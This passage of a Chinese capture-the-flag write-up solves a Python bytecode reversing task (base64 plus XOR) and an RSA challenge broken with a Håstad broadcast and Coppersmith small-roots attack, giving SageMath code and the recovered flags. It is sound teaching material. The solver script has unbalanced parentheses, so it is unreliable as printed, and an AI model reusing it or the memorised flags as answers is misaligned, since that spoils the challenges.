\<div\>

\<span class=\"font-bold text-gray-600\"\>Declared Income:\</span\>

\$flag{c5b34df2e74dc988b73fdca3541f9238}

\</div\>

## 最终 Flag

flag{c5b34df2e74dc988b73fdca3541f9238}

![](media/image23.png){width="6.0in" height="2.026388888888889in"}

# 字节码迷踪

## 题目信息

---

**项目**                            **内容**

---

\*\*题目名称\*\*                    Python Bytecode Reverse

\*\*题目类型\*\*                    Reverse Engineering

\*\*难度等级\*\*                    Easy

\*\*所属比赛\*\*                    御网杯
------------------------------------------

## 开始分析

题目给了一个 .pyc 文件，要求从中提取 flag。

### .pyc 文件结构

.pyc 是 Python 编译后的字节码文件，包含：

• 头部（16字节）：魔数、版本信息、时间戳

• Code Object：marshal 序列化的代码对象

### 反编译方法

用 uncompyle6 或 pycdc 工具反编译：

bash

uncompyle6 main.pyc \> main.py

## 解题

反编译后在 main 函数里看到了 base64 编码的字符串：

python

data =
base64.b64decode(\"aWNuaHRra3lgP2ZhaCJ3eTw3In19N2oiPGY9OCJ5dmdjfnxtPzdjY3ly\")

先做 Base64 解码：

python

import base64

encoded = \"aWNuaHRra3lgP2ZhaCJ3eTw3In19N2oiPGY9OCJ5dmdjfnxtPzdjY3ly\"

decoded = base64.b64decode(encoded)

\# 结果: b\'icnhtkky\`?fah\"wy\<7\"}}7j\"\<f=8\"yvgc\~\|m?7ccyr\'

然后看到有常量 15，用 XOR 0x0f 解密：

python

flag = \'\'.join(chr(b \^ 15) for b in decoded)

## 完整脚本

python

#!/usr/bin/env python3

import base64

def main():

encoded_data =
\"aWNuaHRra3lgP2ZhaCJ3eTw3In19N2oiPGY9OCJ5dmdjfnxtPzdjY3ly\"

decoded_bytes = base64.b64decode(encoded_data)

flag = \'\'.join(chr(b \^ 0x0f) for b in decoded_bytes)

print(flag)

if \_\_name\_\_ == \"\_\_main\_\_\":

main()

## 运行结果

flag{ddvo0ing-xv38-rr8e-3i27-vyhlqsb08llv}

![](media/image24.png){width="6.0in" height="2.5875in"}

# ScatterRSA7

这道题目的类型是 Crypto / RSA / Håstad Broadcast Attack / Coppersmith
小根攻击。

附件有两个文件：

• task(2).py

• output(1).txt

先看一下task(2).py里的核心逻辑：

python

from secret import flag

from Crypto.Util.number import \*

import random

m = bytes_to_long(flag)

e = 3

print(f\"e = {e}\")

for i in range(3):

p = getPrime(512)

q = getPrime(512)

n = p \* q

a = random.getrandbits(128) \| (1 \<\< 127)

b = random.getrandbits(256) \| (1 \<\< 255)

c = pow(a \* m + b, e, n)

print(f\"n{i+1} = {n}\")

print(f\"a{i+1} = {a}\")

print(f\"b{i+1} = {b}\")

print(f\"c{i+1} = {c}\")

可以看到不是普通的RSA加密，而是先对明文m做个线性变换：a \* m +
b，然后再做e=3次幂。

output(1).txt里给了三组n, a, b, c：

• n1, a1, b1, c1

• n2, a2, b2, c2

• n3, a3, b3, c3

## 分析一下漏洞

题目不是普通 RSA 直接加密，而是先对明文 m 做线性变换 \`a \* m +
b，然后再进行 RSA 加密，也就是：

c_i = (a_i \* m + b_i)\^3 mod n_i

也就是：

(a_i \* m + b_i)\^3 - c_i ≡ 0 mod n_i

一共给了三组不同模数，三组数据加密的是同一个明文 \`m\`。

公共指数 \`e = 3\`，同源明文加密有三组，可以用Håstad Broadcast
Attack的变形。这里填充不是相同明文直接加密，而是公开线性填充 a_i \* m +
b_i，但a_i和b_i都是已知的，所以构造关于同一个未知数m的三次多项式同余方程，用CRT合并，再用Coppersmith小根攻击恢复明文。

\-\--

\## 求解过程

对每组数据构造多项式：

f_i(x) = (a_i \* x + b_i)\^3 - c_i

真实明文m满足f_i(m) ≡ 0 mod n_i

然后用CRT把三个多项式合并到模 N = n1 \* n2 \* n3下，得到新的多项式F(x) ≡
0 mod N

因为flag转成长整数后相对N很小，所以m是F(x)的小根。

最后用SageMath的small_roots()求小根，再将整数转回bytes，就能恢复flag了。

\-\--

\## 求解脚本

用SageMath运行这个脚本：

from Crypto.Util.number import long_to_bytes

from sage.all import \*

e = 3

n1 =
102558055343186663774004245568844890040427755081322948573600548239509585214883633195340628827069522286604775501494243615907685151712782581530865998129431728354885279317178049728566079997642323273443241933033328291890485395003727154088683681529677659916295999992031346906916255491474567405265003503172476461157

a1 = 322233126680426744218691479273788605911

b1 =
113407104739548010950312317437369356779954067588625760869814557042295314435044

c1 =
49225161884027208062745800970982301301810963868606790902665484817563928750517760934162220250108416202172052560167565571610692185656919290568681453875376733794633939032199496362899237557958063373760365679992073163897497301673175851024654837579339911029072457963126081770207330552828285162474417987103602893584

n2 =
105607749089439833354938241281662038797254818965502623820940084905553740404236244955616553160897886462688983144719995721986643577170684687774141862551893635081744624479979278779062587094183596873794555569977094545439206110884908521354494036737728724088945212331028162411744422696346593973015708510735649766181

a2 = 208674013365088613687922409755617781500

b2 =
89160755116328707276529242008009983647724660508547675945393614848504486978492

c2 =
100823977301264410406702818225877887251062306868196799888229568511155817549339616047767088881622938056242118529158530631484599149197850087330525833966787846137234743042083091619804122197507398697282386273790702435559383031805114749126613415607028276854179167062349071239932329446243425667105704656167418760443

n3 =
104736444181165818481301566385767414781412801637574933784600172927337820919632304655450089939012009326050319700442382090993038794175586914432289157861877344277442732744943793185425971940046894876466531210814877174701335384714989151133659200381642617749740137899100834067012994888045478443309606485264990780721

a3 = 217638247334448400442271982417884803991

b3 =
73125897050300268198161130557068774390696299745261684229931032525425017405769

c3 =
70732696457160488978663134574436009422933289206543433391146546286480069523341878590724903138816263921318072519848772235353405181549764604005036603907867239845441420827034339779545387806734371714052508485612758756480112411938562711027211054800893238949283781320572296938614486154876383782332027342909100006027

n_list = \[n1, n2, n3\]

a_list = \[a1, a2, a3\]

b_list = \[b1, b2, b3\]

c_list = \[c1, c2, c3\]

N = prod(n_list)

PR.\<x\> = PolynomialRing(Zmod(N))

F = 0

for ni, ai, bi, ci in zip(n_list, a_list, b_list, c_list):

Ni = N // ni

ti = inverse_mod(Ni, ni)

F += Ni \* ti \* ((ai \* x + bi)\^e - ci

F = F.monic()

roots = F.small_roots(X=2\^400, beta=1)

for r in roots:

flag = long_to_bytes(int(r))

print(flag)

\-\--

\## 脚本说明

核心合并部分：

for ni, ai, bi, ci in zip(n_list, a_list, b_list, c_list):

Ni = N // ni

ti = inverse_mod(Ni, ni)

F += Ni \* ti \* ((ai \* x + bi)\^e - ci

这里用CRT系数：Ni = N // ni，ti = inverse_mod(Ni,
ni，构造出在模ni下等价于原多项式、在其他模数下为0的组合项。

这样累加以后，F(x)同时满足三组同余关系：

F(m) ≡ 0 mod n1

F(m) ≡ 0 mod n2

F(m) ≡ 0 mod n3

也就是F(m) ≡ 0 mod N

然后用：

F = F.monic()

roots = F.small_roots(X=2\^400, beta=1)

寻找模N下的小根。

X=2\^400是明文大小上界。一般CTF里flag只有几十字节，转成整数后远小于这个范围。

最后用long_to_bytes把整数形式的明文还原成字符串。

\-\--

\## 运行结果

运行脚本后得到：

b\'flag{674814b9dd6e672e2cea23c96afd0e9a}\'

最终flag就是这个：

flag{674814b9dd6e672e2cea23c96afd0e9a}

![](media/image25.png){width="6.0in" height="2.4277777777777776in"}
